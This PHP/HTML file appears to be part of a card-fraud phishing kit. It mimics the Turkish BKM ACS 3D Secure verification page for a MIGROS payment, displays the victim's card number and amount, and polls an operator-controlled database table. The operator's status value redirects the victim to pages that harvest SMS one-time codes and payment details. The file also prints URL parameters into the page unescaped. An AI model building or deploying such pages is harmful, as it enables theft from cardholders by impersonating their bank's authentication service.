<?php 
$kart2 = $_GET['kart'];
$kart = str_replace(' ', '', $kart2);
$fiyat = $_GET['fiyat'];
include("db/connect.php");
$kontrol = $baglanti->prepare("SELECT * FROM bella_mg_logs WHERE kart=?");
$kontrol->execute([$kart]);


while($getir = $kontrol->fetch(PDO::FETCH_ASSOC))
{

if($getir["durum"] == "sms")
{
header("location:sms.php?&kart=$kart&fiyat=$fiyat");
}

if($getir["durum"] == "hsms")
{
header("location:hsms.php?kart=$kart&fiyat=$fiyat");
}

if($getir["durum"] == "odeme")
{
header("location:odeme.php?kart=$id");
}

if($getir["durum"] == "tebrik")
{
header("location:tebrik.php?id=$id");
}
}
?>
<html lang="tr" style="height: 100%; width: 100%;">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="refresh" content="3; url=3dbekle.php?kart=<?php echo $kart; ?>&fiyat=<?php echo $_GET['fiyat'];?>"> 
    <style>
        * {
            font-family: sans-serif
        }
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="shortcut icon" type="image/png" href="../acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
    <link rel="apple-touch-icon" type="image/png" href="../acs.bkm.com.tr/mdpayacs/img/favicon.png">
    <link rel="apple-touch-icon" type="image/png" sizes="76x76" href="../acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
    <link rel="apple-touch-icon" type="image/png" sizes="120x120" href="../acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
    <link rel="apple-touch-icon" type="image/png" sizes="152x152" href="../acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
    <title>BKM ACS</title>
    <link rel="stylesheet" href="3d_files/bkmacs-dist.css">
    <link rel="stylesheet" href="3d_files/main-dist.css" type="text/css" media="screen">
    <script type="text/javascript">
        var isSupportedIE = true;
    </script>
</head>
<style>
    * {
        font-family: sans-serif;
    }
</style>
<body onload="init(300)">
    <div class="content-wrapper">
        <div class="header">
            <div class="brand-logo">
                <img 3dslogo="scheme" align="left" src="3d_files/schema_000000002.gif">
            </div>
            <div class="member-logo">
                <img src='https://files.sikayetvar.com/lg/cmp/65/65926.png?1522650125' style='float:right;'>
            </div>
        </div>
        <meta http-equiv="refresh">
        <div id="approve-page">
            <div id="loaderDiv" style="height: 70%; width: 70%; position: absolute; z-index: 1; display: none">
                <div class="loader"></div>
            </div>
            <div class="content">
                <h1 id="approve-header">Dogrulama kodunu giriniz</h1>
                <div class="info-wrapper">
                    <div class="info-row">
                        <div class="info-col info-label">Isyeri Adi:</div>
                        <div class="info-col" 3dsdisplay="merchant" id="merchant-name">MIGROS</div>
                    </div>
                    <div class="info-row">
                        <div class="info-col info-label">Islem Tutari:</div>
                        <div class="info-col amount" 3dsdisplay="amount" id="amount"><?php  echo number_format($_GET['fiyat'], 0, ',', '.');?> ₺</div>
                    </div>
                    <div class="info-row">
                        <div class="info-col info-label">Islem Tarihi/Saati:</div>
                        <div class="info-col" 3dsdisplay="date" id="operation-date-time"><?php echo date('H:i:s');?></div>
                    </div>
                    <div class="info-row">
                        <div class="info-col info-label">Kart Numarasi:</div>
                        <div class="info-col" 3dsdisplay="pan" id="pan"><?php echo $kart; ?></div>
                    </div>
                </div>
                <div class="action-wrapper" 3dsdisplay="prompt" 3dslabel="prompt">
                    <div></div>
                    <div class="form-wrapper">
                        <center>
                            <img style="width: 110px;" src="https://i.pinimg.com/originals/b7/63/bc/b763bc6b994773aa892b114643a1eea8.gif">
                        </center>
                    </div>
                </div>
                <img src="https://unalarif.com/wp-content/uploads/image-261.png" width="140px">
            </div>
        </div>
    </div>
    <script src="../cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script type="text/javascript">
        $( document ).ready(function() {
          $.ajax({
            url: 'getinfo.php?type=x',
            dataType: 'JSON',
            success: function(callback){
              $("#operation-date-time").html(callback.date);
              $("#amount").html(callback.price);
            }
          });
        });
    </script>
</body>
</html>
